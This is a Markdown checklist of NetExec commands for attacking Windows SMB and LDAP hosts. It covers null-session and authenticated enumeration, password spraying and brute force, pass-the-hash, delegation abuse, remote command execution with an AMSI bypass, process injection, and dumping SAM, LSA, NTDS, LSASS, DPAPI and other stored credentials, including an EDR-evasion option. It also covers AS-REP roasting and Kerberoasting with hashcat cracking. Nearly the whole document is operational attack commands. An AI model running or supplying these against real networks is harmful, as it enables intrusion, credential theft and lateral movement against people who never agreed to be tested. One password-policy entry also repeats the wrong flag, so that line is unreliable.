
---

# SMB

---
## RECON // NO CREDENTIALS

** ENUMERATE SMB HOSTS **

 - [ ] `nxc smb <ip-range>` 

** NULL SESSIONS **

- [ ] `nxc smb <ip-range> -u '' -p ''`
- [ ] `nxc smb <ip-range> -u '' -p '' --shares`
- [ ] `nxc smb <ip-range> -u '' -p '' --pass-pol`
- [ ] `nxc smb <ip-range> -u '' -p '' --users`
- [ ] `nxc smb <ip-range> -u '' -p '' --groups`

** GUEST LOGON **

- [ ] `nxc smb <ip-range> -u 'a' -p ''` 
- [ ] `nxc smb <ip-range> -u 'a' -p '' --shares`

** SMB Signing:False **

- [ ] `nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt`
---
## RECON // WITH CREDENTIALS

** ENUMERATE ACTIVE SESSIONS **

- [ ] `nxc smb <ip-range> -u 'username' -p 'password' --sessions`

** ENUMERATE SHARES ** 

- [ ] `nxc smb <ip-range> -u 'username' -p 'password' --shares`

** ENUMERATE NETWORK INTERFACES **

- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --interfaces`

** ENUMERATE DISKS **

- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --disks`

** ENUMERATE LOGGED ON USERS **

- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --loggedon-users`

** ENUMERATE DOMAIN USERS **

- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --users`

** ENUMERATE USERS w RID **

- [ ] `nxc smb <ip-range> -u 'username' -p 'password' --rid-brute`

** ENUMERATE DOMAIN GROUPS **

- [ ] `nxc smb <ip-range> -u 'username' -p 'password' --groups`

** ENUMERATE LOCAL GROUPS **

- [ ] `nxc smb <ip-range> -u 'username' -p 'password' --local-group`

** ENUMERATE PASSWORD POLICY **

- [ ] `nxc smb <ip-range> -u 'username' -p 'password' --local-group`

** ENUMERATE AV **

- [ ] `nxc smb <ip-address> -u user -p pass -M enum_av`
---
## PASSWORD SPRAYING

*pay attention to password policy to avoid account lockout*

- [ ] `nxc smb <ip-address> -u user1 user2 user3 -p Summer18`
- [ ] `nxc smb <ip-address> -u user1 -p password1 password2 password3`
- [ ] `nxc smb <ip-address> -u /path/to/users.txt -p Summer18`
- [ ] `nxc smb <ip-address> -u Administrator -p /path/to/passwords.txt`
- [ ] `nxc smb <ip-address> -u /path/to/users.txt -p Summer18 --continue-on-success`// *continue on success*
- [ ] `nxc smb <ip-address> -u user.txt -p password.txt` // *classic bruteforce*
- [ ] `nxc smb <ip-address> -u user.txt -p password.txt --no-bruteforce --continue-on-success` // *no bruteforce*
---
## CHECK CREDS
- Failed logins result in a [-]
- Successful logins result in a [+] Domain\Username:Password

- [ ] `nxc smb <ip-range> -u domainuser -p 'password'` 
- [ ] `nxc smb <ip-range> -u localuser -p 'password' --local-auth`
- [ ] `nxc smb <ip-range> -u domainuser -H '13b29964cc2480b4ef454c59562e675c'` 
- [ ] `nxc smb <ip-range> -u localuser -H '13b29964cc2480b4ef454c59562e675c' --local-auth`
---
## DELEGATION

** RCBD ** 

- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --delegate Administrator`

** S4U2Self ** 

- [ ] `nxc smb <ip-address> -u 'machineuser$' -H 220fc1990391bdc183d1a68c389c0229 --delegate Administrator --self`
---
## COMMAND EXECUTION

*Try changing the execution method with --exec-method (wmiexec, atexec, smbexec)*
*"-X" is for powershell commands*

- [ ] `nxc <ip-address> -u 'username' -p 'password' -x whoami`
- [ ] `nxc <ip-address> -u 'username' -p 'password' -X '$PSVersionTable'`
- [ ] `nxc <ip-address> -u 'username' -p 'password' -X '$PSVersionTable'  --amsi-bypass /path/payload`
---
## PROCESS INJECTION

- [ ] `nxc <ip-address> -u 'username' -p 'password' -M pi -o PID=<target_process_pid> EXEC=<command>`
---
## SPIDER SHARES

- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --spider` 
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --spider C\$ --pattern <pattern>`
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' -M spider_plus` 
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' -M spider_plus -o DOWNLOAD_FLAG=True`
---
## GET AND PUT FILES

- [ ] `nxc smb 172.16.251.152 -u user -p pass --get-file  \\Windows\\Temp\\whoami.txt /tmp/whoami.txt`
- [ ] `nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt`
---
## DUMP CREDENTIALS

** DUMP SAM **
- [ ] `nxc smb <ip-range> -u 'username' -p 'password' --sam` 

** DUMP LSA **
- [ ] `nxc smb <ip-range> -u 'username' -p 'password' --lsa` 

** DUMP NTDS **
*Requires Domain Admin or Local Admin on DC*
- [ ] `nxc smb <ip-address>  -u 'username' -p 'password' --ntds`
- [ ] `nxc smb <ip-address>  -u 'username' -p 'password' --ntds --users`
- [ ] `nxc smb <ip-address>  -u 'username' -p 'password' --ntds --users --enabled`
- [ ] `nxc smb <ip-address>  -u 'username' -p 'password' --ntds vss`
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' -M ntdsutil`

** DUMP LSASS **
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' -M lsassy`

** DUMP DPAPI **
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --dpapi`
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --dpapi cookies`
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --dpapi nosystem`  // *escape edr*
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --local-auth --dpapi nosystem`

** DUMP SCCM **
*Requires Domain Admin or Local Admin on DC*
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --sccm`
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --sccm disk`
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' --sccm wmi`

** DUMP WIFI PASS **
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' -M wireless`

** DUMP VNC **
- [ ] `nxc smb <ip-address> -u 'username' -p 'password' -M vnc`
---

# LDAP

---
## CHECK CREDS

- Failed logins result in a [-]
- Successful logins result in a [+] Domain\Username:Password

- [ ] `nxc ldap <ip-range> -u users.txt -p '' -k`
- [ ] `nxc ldap <ip-range> -u 'username' -p 'password'`
- [ ] `nxc ldap <ip-range> -u 'username' -H A29F7623FD11550DEF0192DE9246F46B`
---
## ENUM USERS 

- [ ] `nxc ldap <ip-range> -u 'username' -p 'password' --users`
- [ ] `nxc ldap <ip-range> -u 'username' -p 'password' --active-users`
---
## LDAP QUERY

- [ ] `nxc ldap <ip-address>  -u 'username' -p 'password'--query "(sAMAccountName=Administrator)" ""`
- [ ] `nxc ldap <ip-address> -u 'username' -p 'password' --query "(sAMAccountName=Administrator)" "sAMAccountName objectClass pwdLastSet"`
---
## ASREPRoast

- [ ] `nxc ldap <ip-address> -u 'username' -p '' --asreproast output.txt`
- [ ] `nxc ldap <ip-address> -u users.txt -p '' --asreproast output.txt`
- [ ] `nxc ldap <ip-address> -u 'username' -p 'password' --asreproast output.txt`
- [ ] `nxc ldap <ip-address> -u 'username' -p 'password' --asreproast output.txt --kdcHost domain_name`
- [ ] `hashcat -m18200 output.txt <wordlist>`
---
## KERBEROASTING

- [ ] `nxc ldap <ip-address> -u 'username' -p '' --kerberoasting output.txt`
- [ ] `hashcat -m13100 output.txt <wordlist>`
---
## BLOODHOUND

- [ ] `nxc ldap <ip-address> -u 'username' -p 'password' --bloodhound --collection All`
- [ ] `nxc ldap <ip-address> -u 'username' -p 'password' --bloodhound --collection Loggedon`